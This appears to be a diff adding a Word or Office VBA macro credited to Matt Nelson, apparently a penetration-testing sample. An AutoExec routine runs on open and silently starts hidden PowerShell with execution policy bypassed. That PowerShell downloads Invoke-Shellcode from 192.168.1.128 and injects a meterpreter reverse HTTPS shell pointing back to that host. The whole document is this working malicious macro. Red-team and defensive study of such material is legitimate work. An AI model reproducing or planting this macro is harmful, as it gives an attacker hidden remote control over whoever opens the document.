@@ -1,0 +1,29 @@
+'Written By Matt Nelson @enigma0x3
+
+Sub Irelp13(Irelp10 As String)
+    Dim Irelp7 As Integer
+    Dim Irelp2 As String
+    Irelp2 = Environ("USERPROFILE")
+    ChDrive (Irelp2)
+    ChDir (Irelp2)
+    Irelp7 = Shell(Irelp10, vbHide)
+End Sub
+Sub AutoExec()
+Execute
+End Sub
+
+Public Function Execute() As Variant
+
+Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.128/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.128 -Lport 1111 -Force", Null, objConfig, intProcessID
+
+End Function
+
+
